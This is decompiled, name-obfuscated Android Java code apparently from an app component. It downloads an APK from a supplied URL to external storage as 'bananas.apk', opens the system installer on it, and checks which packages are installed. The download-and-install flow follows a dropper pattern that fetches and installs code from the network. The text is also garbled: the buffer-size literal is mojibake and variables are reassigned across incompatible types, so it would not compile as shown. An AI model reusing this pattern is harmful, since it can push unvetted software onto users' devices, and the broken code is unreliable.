package com.nddroid.down;

import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Environment;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.List;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.StatusLine;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;

public final class b
{
  public static Context a;
  private static final String b = Environment.getExternalStorageDirectory().getPath() + "/bananas";
  
  public b() {}
  
  public static void a(String paramString)
  {
    paramString = new HttpGet(paramString);
    d.a(b);
    try
    {
      paramString = new DefaultHttpClient().execute(paramString);
      if (paramString.getStatusLine().getStatusCode() == 200)
      {
        paramString = paramString.getEntity().getContent();
        FileOutputStream localFileOutputStream = new FileOutputStream(b + "/bananas.apk");
        byte[] arrayOfByte = new byte['â€€'];
        for (;;)
        {
          int i = paramString.read(arrayOfByte);
          if (i == -1)
          {
            localFileOutputStream.close();
            paramString.close();
            c(b + "/bananas.apk");
            return;
          }
          localFileOutputStream.write(arrayOfByte, 0, i);
        }
      }
      return;
    }
    catch (Exception paramString)
    {
      paramString.printStackTrace();
    }
  }
  
  public static boolean b(String paramString)
  {
    List localList = a.getPackageManager().getInstalledPackages(0);
    ArrayList localArrayList = new ArrayList();
    int i;
    if (localList != null) {
      i = 0;
    }
    for (;;)
    {
      if (i >= localList.size()) {
        return localArrayList.contains(paramString);
      }
      localArrayList.add(((PackageInfo)localList.get(i)).packageName);
      i += 1;
    }
  }
  
  private static void c(String paramString)
  {
    paramString = new File(paramString);
    Intent localIntent = new Intent();
    localIntent.addFlags(268435456);
    localIntent.setAction("android.intent.action.VIEW");
    localIntent.setDataAndType(Uri.fromFile(paramString), "application/vnd.android.package-archive");
    a.startActivity(localIntent);
  }
}
